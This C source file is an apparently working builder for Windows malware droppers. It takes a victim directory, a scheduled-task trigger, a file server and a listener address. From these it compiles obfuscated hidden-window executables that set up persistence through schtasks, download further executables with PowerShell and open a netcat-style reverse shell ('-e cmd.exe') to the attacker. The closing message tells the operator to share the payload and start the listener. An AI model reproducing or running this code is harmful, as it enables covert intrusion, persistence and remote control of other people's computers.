#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define SOURCE_CODE "#include <iostream>\n#include <windows.h>\n#include <string>\nint main(int argc, char *argv[])\n{\nShowWindow(GetConsoleWindow(), SW_HIDE);\nsystem("

void get(char *prompt, char *str, int size)
{
    printf("%s", prompt);

    fgets(str, size, stdin);

    if (str[strlen(str) - 1] == '\n')
        str[strlen(str) - 1] = '\0';

    fflush(stdin);
}

void compile(char *compiled_file, char *first_file_provided, char *type)
{
    char cmd[2000];

    strcpy(cmd, "windres RES/RC/res_");
    strcat(cmd, type);
    strcat(cmd, ".rc -O coff -o RES/RC/res_TMP");
    system(cmd);
    sleep(2);
    cmd[0] = '\0';
    strcat(cmd, "start g++ -static ");
    strcat(cmd, compiled_file);
    strcat(cmd, " RES/RC/res_TMP -o OUTPUT/");
    strcat(cmd, first_file_provided);
    strcat(cmd, ".exe");
    system(cmd);
    sleep(2);
    remove(compiled_file);
    remove("RES/RC/res_TMP");
}

char *generateRandomString(char *string, const int length)
{
    static const char alphanum[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < length; ++i)
    {
        string[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    string[length] = 0;
    return string;
}

void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
{
    FILE *c_TMP;
    int i = 0;
    int j = 0;
    int k = 0;
    char cmd[100][10000];
    char source_code[10000];
    char random_variable[2000];
    char alphabet[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 .-><:'()/&";

    source_code[0] = '\0';
    strcat(source_code, "#include <iostream>\n#include <windows.h>\n#include <string>\nint main(int argc, char *argv[])\n{\nShowWindow(GetConsoleWindow(), SW_HIDE);\n");

    c_TMP = fopen(tmp_file_name, "w+");
    fputs(source_code, c_TMP);
    source_code[0] = '\0';

    while (i != strlen(alphabet))
    {
        char letter[2] = {alphabet[i], '\0'};
        strcat(source_code, "std::string ");
        strcat(source_code, generateRandomString(random_variable, rand() % 50 +1));
        strcat(source_code, " = \"");
        strcat(source_code, letter);
        strcat(source_code, "\";");
        strcat(source_code, "\n");

        strcpy(cmd[i], random_variable);
        i++;
    }

    fputs(source_code, c_TMP);
    source_code[0] = '\0';

    strcat(source_code, "system((");
    while (k != strlen(cmd_non_obfuscate))
    {
        char letter[2] = {cmd_non_obfuscate[k], '\0'};
        for (j = 0; j < strlen(alphabet); j++)
        {
            char alpha_letter[2] = {alphabet[j], '\0'};
            if (letter[0] == alpha_letter[0])
            {
                strcat(source_code, cmd[j]);
                strcat(source_code, "+");
            }
        }
        k++;
    }

    source_code[strlen(source_code) - 1] = '\0';
    strcat(source_code, ").c_str());\nreturn 0;\n}");
    fputs(source_code, c_TMP);
    fclose(c_TMP);
}

void generatePayload(char *victim_dir, char *file_provider, char *first_file_provided, char *second_file_provided, char *task_name, char *task_trigger, char *payload_name)
{
    char cmd_PAYLOAD[1000];

    cmd_PAYLOAD[1] = '\0';
    strcat(cmd_PAYLOAD, "c: & cd / & mkdir ");
    strcat(cmd_PAYLOAD, victim_dir);
    strcat(cmd_PAYLOAD, " & cd ");
    strcat(cmd_PAYLOAD, victim_dir);
    strcat(cmd_PAYLOAD, " & schtasks /create /tn ");
    strcat(cmd_PAYLOAD, task_name);
    strcat(cmd_PAYLOAD, " /tr ");
    strcat(cmd_PAYLOAD, victim_dir);
    strcat(cmd_PAYLOAD, "/");
    strcat(cmd_PAYLOAD, first_file_provided);
    strcat(cmd_PAYLOAD, ".exe ");
    strcat(cmd_PAYLOAD, task_trigger);
    strcat(cmd_PAYLOAD, " /f & powershell.exe (wget 'http://");
    strcat(cmd_PAYLOAD, file_provider);
    strcat(cmd_PAYLOAD, "/");
    strcat(cmd_PAYLOAD, first_file_provided);
    strcat(cmd_PAYLOAD, ".exe' -OutFile ");
    strcat(cmd_PAYLOAD, first_file_provided);
    strcat(cmd_PAYLOAD, ".exe) & powershell.exe (wget 'http://");
    strcat(cmd_PAYLOAD, file_provider);
    strcat(cmd_PAYLOAD, "/");
    strcat(cmd_PAYLOAD, second_file_provided);
    strcat(cmd_PAYLOAD, ".exe' -OutFile ");
    strcat(cmd_PAYLOAD, second_file_provided);
    strcat(cmd_PAYLOAD, ".exe) & ");
    strcat(cmd_PAYLOAD, first_file_provided);
    strcat(cmd_PAYLOAD, ".exe & exit\"");

    obfuscate("c_TMP_PAYLOAD.cpp", cmd_PAYLOAD);
    compile("c_TMP_PAYLOAD.cpp", payload_name, "PAYLOAD");
}

void generateExtension(char *victim_dir, char *host, char *port, char *second_file_provided, char *first_file_provided)
{
    char cmd_EXTENSION[2000];

    cmd_EXTENSION[0] = '\0';
    strcat(cmd_EXTENSION, "START /MIN ");
    strcat(cmd_EXTENSION, victim_dir);
    strcat(cmd_EXTENSION, "/");
    strcat(cmd_EXTENSION, second_file_provided);
    strcat(cmd_EXTENSION, ".exe ");
    strcat(cmd_EXTENSION, host);
    strcat(cmd_EXTENSION, " ");
    strcat(cmd_EXTENSION, port);
    strcat(cmd_EXTENSION, " -e cmd.exe -d ^");

    obfuscate("c_TMP_EXTENSION.cpp", cmd_EXTENSION);
    compile("c_TMP_EXTENSION.cpp", first_file_provided, "FILE_A");
}

int main(int argc, char const *argv[])
{
    srand(time(NULL));

    printf(".___.__  .______  .______  ._______._____.___ ._____  \n");
    printf(":   |  \\ :      \\ : __   \\ : .____/:         |:_ ___\\ \n");
    printf("|   :   ||   .   ||  \\____|| : _/\\ |   \\  /  ||   |___\n");
    printf("|   .   ||   :   ||   :  \\ |   /  \\|   |\\/   ||   /  |\n");
    printf("|___|   ||___|   ||   |___\\|_.: __/|___| |   ||. __  |\n");
    printf("    |___|    |___||___|       :/         |___| :/ |. |\n");
    printf("                                               :   :/ \n");

    printf(" Created by mickdec. https://github.com/mickdec/Haremg0.B-cl\n\n");

    char payload_name[200] = "PAYLOAD";
    char choice[10];
    char victim_dir[255];
    char file_provider[255];
    char first_file_provided[255];
    char second_file_provided[255];
    char host[255];
    char port[255];
    char task_name[255];
    char task_trigger[255];
    char task_number[255];

    while (strcmp(choice, "y") != 0 || strcmp(choice, "Y") != 0 || strcmp(choice, "n") == 0 || strcmp(choice, "N") == 0)
    {
        get("Do you want to do a full config ? [y/n] : ", choice, 10);

        if (strcmp(choice, "y") == 0 || strcmp(choice, "Y") == 0)
        {
            get("Please enter the dir you want to create to the victim [default : 'C:/System']: ", victim_dir, 255);
            if (strlen(victim_dir) == 0)
            {
                strcpy(victim_dir, "C:/System");
            }

            get("Please enter the name for the system task you want to create to the victim [default : 'TaskSystem']: ", task_name, 255);
            if (strlen(task_name) == 0)
            {
                strcpy(task_name, "TaskSystem");
            }

            while (strcmp(task_trigger, "1") != 0 || strcmp(task_trigger, "2") != 0 || strcmp(task_trigger, "3") == 0 || strcmp(task_trigger, "4") == 0 || strcmp(task_trigger, "5") == 0 || strcmp(task_trigger, "6") == 0)
            {
                printf("1 - MINUTE - Run the task on specified minutes.\n");
                printf("2 - HOURLY - Run the task on specified hours.\n");
                printf("3 - DAILY - Run the task on specified day.\n");
                printf("4 - ONSTART - Run the task on startup.\n");
                printf("5 - ONLOGON - Run the task on longon.\n");
                printf("6 - ONIDLE - Run the task on idle.\n");
                get("Please enter the time of recursive call for the system task you want to create to the victim [default : 'minutes']: ", task_trigger, 255);
                if (strlen(task_trigger) == 0)
                {
                    strcpy(task_trigger, "/sc minute /MO 5");
                    break;
                }
                else if (strcmp(task_trigger, "1") == 0)
                {
                    strcpy(task_trigger, "/sc minute /MO ");
                    get("How many minutes ? : ", task_number, 10);
                    strcat(task_trigger, task_number);
                    break;
                }
                else if (strcmp(task_trigger, "2") == 0)
                {
                    strcpy(task_trigger, "/sc hour /MO ");
                    get("How many hours ? : ", task_number, 10);
                    strcat(task_trigger, task_number);
                    break;
                }
                else if (strcmp(task_trigger, "3") == 0)
                {
                    strcpy(task_trigger, "/sc daily /MO  ");
                    get("How many days ? : ", task_number, 10);
                    strcat(task_trigger, task_number);
                    break;
                }
                else if (strcmp(task_trigger, "4") == 0)
                {
                    strcpy(task_trigger, "/SC ONSTART");
                    break;
                }
                else if (strcmp(task_trigger, "5") == 0)
                {
                    strcpy(task_trigger, "/SC ONLOGON");
                    break;
                }
                else if (strcmp(task_trigger, "6") == 0)
                {
                    strcpy(task_trigger, "/sc onidle /I ");
                    get("How many idle time ? : ", task_number, 10);
                    strcat(task_trigger, task_number);
                    break;
                }
            }

            get("Please enter your server (who provide the files) adress [example : 10.0.0.1/RES or provider.com]: ", file_provider, 255);
            while (strlen(file_provider) == 0)
            {
                get("Please enter your file provider adress [example : 10.0.0.1/RES or provider.com]: ", file_provider, 255);
            }

            get("Please enter the first file your file provider will serve [example : FileA]: ", first_file_provided, 255);
            while (strlen(first_file_provided) == 0)
            {
                get("Please enter the first file your file provider will serve [example : FileA]: ", first_file_provided, 255);
            }

            get("Please enter the second file your file provider will serve [example : FileB]: ", second_file_provided, 255);
            while (strlen(second_file_provided) == 0)
            {
                get("Please enter the second file your file provider will serve [example : FileB]: ", second_file_provided, 255);
            }

            get("Please enter your listener IP [example : 10.0.0.1]: ", host, 25);
            while (strlen(host) == 0)
            {
                get("Please enter your listener IP [example : 10.0.0.1]: ", host, 25);
            }

            get("Please enter your listener PORT [default : 4444]: ", port, 10);
            while (strlen(port) == 0)
            {
                strcpy(port, "4444");
            }
            break;
        }
        else if (strcmp(choice, "n") == 0 || strcmp(choice, "N") == 0)
        {
            strcpy(victim_dir, "C:/System");
            strcpy(first_file_provided, "FILE_A");
            strcpy(second_file_provided, "FILE_B");
            strcpy(task_name, "TaskSystem");
            strcpy(task_trigger, "/sc minute /mo 5");

            get("Please enter your file provider adress [example : 10.0.0.1/RES or provider.com]: ", file_provider, 255);
            while (strlen(file_provider) == 0)
            {
                get("Please enter your file provider adress [example : 10.0.0.1/RES or provider.com]: ", file_provider, 255);
            }

            get("Please enter your listener IP [example : 10.0.0.1]: ", host, 25);
            while (strlen(host) == 0)
            {
                get("Please enter your listener IP [example : 10.0.0.1]: ", host, 25);
            }

            get("Please enter your listener PORT [default : 4444]: ", port, 10);
            while (strlen(port) == 0)
            {
                strcpy(port, "4444");
            }
            break;
        }
    }

    printf("CREATED DIR : %s\n", victim_dir);
    printf("FILE PROVIDER IP : %s\n", file_provider);
    printf("FILES PROVIDED : %s and %s\n", first_file_provided, second_file_provided);
    printf("HOST PROVIDED : %s\n", host);
    printf("PORT PROVIDED : %s\n", port);

    generatePayload(victim_dir, file_provider, first_file_provided, second_file_provided, task_name, task_trigger, payload_name);
    generateExtension(victim_dir, host, port, second_file_provided, first_file_provided);

    printf("Now you just have to place %s.exe and %s.exe here %s, share %s.exe and start your listener.\nHappy hunting !!", first_file_provided, second_file_provided, file_provider, payload_name);
    scanf("%d");

    return 0;
}
